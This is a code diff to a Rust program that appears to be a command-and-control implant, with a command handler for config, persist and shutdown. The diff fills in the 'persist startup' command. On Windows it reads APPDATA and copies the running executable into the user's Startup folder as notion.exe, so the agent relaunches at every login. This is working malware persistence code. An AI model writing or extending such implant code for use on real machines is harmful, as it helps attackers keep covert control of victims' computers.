@@ -7,8 +7,8 @@ use std::result::Result;
 use std::io::copy;
 use std::fmt;
 use std::path::Path;
-use std::fs::{write, File};
-use std::env::{set_current_dir, current_dir};
+use std::fs::{write, File, copy as fs_copy};
+use std::env::{set_current_dir, current_dir, var, args};
 use std::process::Command;
 use reqwest::{Client};
 use crate::config::ConfigOptions;
@@ -199,7 +199,30 @@ impl NotionCommand {
                 Ok(format!("Config file saved to {s}").to_string())
             },
             CommandType::Persist(s) => {
-               Ok("Persisting!".to_string())
+                #[cfg(windows)]
+                // `persist [method] [args]`
+                match s.trim() {
+                    "startup" => {
+                        // Get user
+                        if let Ok(v) = var("APPDATA") {
+                            let mut persist_path: String = v;
+                            persist_path.push_str(r"\Microsoft\Windows\Start Menu\Programs\Startup\notion.exe");
+                            let exe_path = args().nth(0).unwrap();
+                            println!("{exe_path}");
+                            // let mut out_file = File::create(path).expect("Failed to create file");
+                            match fs_copy(&exe_path, &persist_path) {
+                                Ok(b)  => { return Ok(format!("{b} bytes written to {persist_path}").to_string());},
+                                Err(e) => { return Ok(e.to_string())}
+                            }
+                        } else {
+                            return Ok("Couldn't get APPDATA location".to_string());
+                        };
+                    },
+                    _ => Ok("That's not a persistence method!".to_string())                    
+                }
+                #[cfg(not(windows))]
+                Ok("Windows only!".to_string())
+        
             },
             CommandType::Shutdown => {
                 Ok(String::from("Shutting down"))
